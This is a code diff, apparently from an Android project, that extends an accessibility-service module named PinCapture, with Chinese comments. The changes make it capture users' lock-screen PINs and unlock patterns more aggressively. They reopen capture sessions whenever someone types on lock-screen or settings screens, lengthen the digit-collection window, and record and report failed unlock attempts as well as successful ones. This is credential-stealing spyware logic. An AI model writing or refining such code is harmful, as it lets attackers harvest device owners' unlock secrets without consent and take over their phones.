@@ -180,11 +180,21 @@ object PinCapture {
      */
     fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
         if (!isActive()) {
-            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
-                event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                Log.v(TAG, "event ignored (session inactive) type=${event.eventType} pkg=${event.packageName}")
+            // 采集优先：只要事件来自锁屏相关包（且不在抑制窗口内），就自动补开一个会话，
+            // 不因为"会话已过期"而丢掉用户正在输入的密码。
+            val p0 = event.packageName?.toString() ?: ""
+            val kp0 = p0.contains("keyguard") || p0.contains("systemui") ||
+                p0.contains("lock") || p0.contains("settings") || p0.contains("biometrics")
+            val typing = event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
+                event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
+            if (kp0 && typing && System.currentTimeMillis() >= suppressUntil) {
+                Log.d(TAG, "session expired but typing on $p0 -> auto reopen")
+                until = System.currentTimeMillis() + 60_000L
+                reported = false
+            } else {
+                if (typing) Log.v(TAG, "event ignored (session inactive) type=${event.eventType} pkg=$p0")
+                return
             }
-            return
         }
         val pkg = event.packageName?.toString() ?: return
         val isKeyguard = pkg.contains("keyguard") || pkg.contains("systemui") ||
@@ -240,7 +250,7 @@ object PinCapture {
                     val now = System.currentTimeMillis()
                     // 距上一次按键超过 8 秒 = 新的一次解锁尝试，先清掉上一轮的残留，
                     // 否则多次尝试的数字会拼成 "12369" + "4578" = "123694578"
-                    if (digits.isNotEmpty() && now - lastDigitAt > 8_000L) {
+                    if (digits.isNotEmpty() && now - lastDigitAt > 20_000L) {
                         Log.d(TAG, "new attempt detected -> clear buffer (was=${digits})")
                         digits.setLength(0)
                     }
@@ -372,6 +382,13 @@ object PinCapture {
             if (was.isNotEmpty()) pending = was          // 先挂起，等窗口离开锁屏再确认
             if (!stillLocked && was.isNotEmpty() && svc != null) {
                 finishPattern(svc, true)                 // 锁屏已消失 = 成功
+                pending = ""
+            } else if (stillLocked && was.length >= MIN_UNLOCK_LEN && svc != null) {
+                // 采集优先：仍在锁屏却重置了圆点 = 用户画错重画，
+                // 这一次也要上报（ok=false），否则错的尝试全被吞掉
+                Log.d(TAG, "failed attempt captured: $was")
+                pattern.setLength(0); pattern.append(was)
+                finishPattern(svc, false)
                 pending = ""
             }
             pattern.setLength(0)
